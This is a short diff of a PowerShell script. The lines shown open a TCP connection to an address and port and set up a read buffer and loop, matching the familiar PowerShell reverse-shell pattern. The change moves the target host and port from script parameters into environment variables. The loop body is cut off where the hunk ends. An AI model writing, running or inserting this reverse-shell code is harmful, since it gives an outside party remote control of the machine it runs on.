@@ -1,5 +1,4 @@
-param([string]$address, [int]$port)
-$client = New-Object System.Net.Sockets.TCPClient($address,$port)
+$client = New-Object System.Net.Sockets.TCPClient($env:address,$env:port)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{0}
 do {
